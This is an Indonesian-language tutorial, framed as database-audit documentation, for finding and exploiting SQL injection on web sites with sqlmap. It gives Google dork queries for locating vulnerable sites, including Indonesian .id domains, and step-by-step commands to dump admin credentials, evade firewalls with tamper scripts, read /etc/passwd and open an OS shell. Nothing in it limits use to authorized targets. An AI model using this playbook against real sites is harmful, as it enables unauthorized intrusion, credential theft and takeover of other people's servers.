Dokumentasi Teknis Ekstraksi & Eksploitasi Database

Panduan komprehensif mengenai metodologi audit database menggunakan framework sqlmap, mencakup tahap enumerasi skema hingga pengambilalihan hak akses sistem.

01. Reconnaissance & Target Acquisition

Tahap awal melibatkan pencarian titik masuk (entry point) melalui teknik Google Dorking untuk mengidentifikasi aplikasi web yang terekspos dengan parameter dinamis.

Google Search Queries:
# Mencari parameter PHP dinamis
inurl:index.php?id=

# Mencari pesan kesalahan SQL yang bocor
"SQL syntax error" site:.id

# Mencari direktori administrasi
intitle:"login" inurl:"/admin/login.php"

02. Enumerasi Sidik Jari (Fingerprinting)

Sebelum melakukan penarikan data, sistem perlu melakukan identifikasi terhadap jenis DBMS, versi, dan hak akses pengguna saat ini.

# Cek informasi dasar & hak akses admin
python3 sqlmap.py -u "URL" --banner --current-user --is-dba

# Cek daftar hak istimewa (privileges) user database
python3 sqlmap.py -u "URL" --privileges

03. Skema Enumerasi & Dumping

Tahap inti di mana struktur data dipetakan secara hierarkis untuk menemukan informasi sensitif seperti kredensial administrator.

Langkah 1: Mendapatkan Database

python3 sqlmap.py -u "URL" --dbs

Langkah 2: Menemukan Tabel dalam Database Terpilih

python3 sqlmap.py -u "URL" -D nama_database --tables

Langkah 3: Menemukan Kolom dalam Tabel Terpilih

python3 sqlmap.py -u "URL" -D nama_database -T nama_tabel --columns

Langkah 4: Ekstraksi Data (The Final Dump)

# Dump kolom username dan password saja
python3 sqlmap.py -u "URL" -D db -T users -C "user,pass" --dump

# Dump seluruh isi tabel secara otomatis
python3 sqlmap.py -u "URL" -D db -T users --dump-all

04. Teknik Bypass Modern (WAF/IDS)

Jika target dilindungi firewall, gunakan parameter optimasi berikut untuk menghindari blokir alamat IP.

python3 sqlmap.py -u "URL" --random-agent --level=5 --risk=3
--tamper=space2comment,between,randomcase,charencode

Tamper Script Analysis:

  • space2comment: Mengubah spasi menjadi /**/ untuk mematikan filter regex.
  • randomcase: Mengacak besar-kecil huruf (SeLeCt) untuk bypass signature.
  • between: Mengganti operator '>' dengan operator 'BETWEEN'.

05. Post-Exploitation & OS Access

Tahap akhir untuk mendapatkan kendali penuh atas sistem operasi server web melalui celah database.

# Membaca file internal server (Contoh: /etc/passwd)
python3 sqlmap.py -u "URL" --file-read="/etc/passwd"

# Mendapatkan shell terminal interaktif
python3 sqlmap.py -u "URL" --os-shell

Kebutuhan Shell:

  • Web server harus memiliki izin tulis (writable).
  • User database harus memiliki hak FILE privilege.
  • Database harus berupa MySQL, PostgreSQL, atau SQL Server.
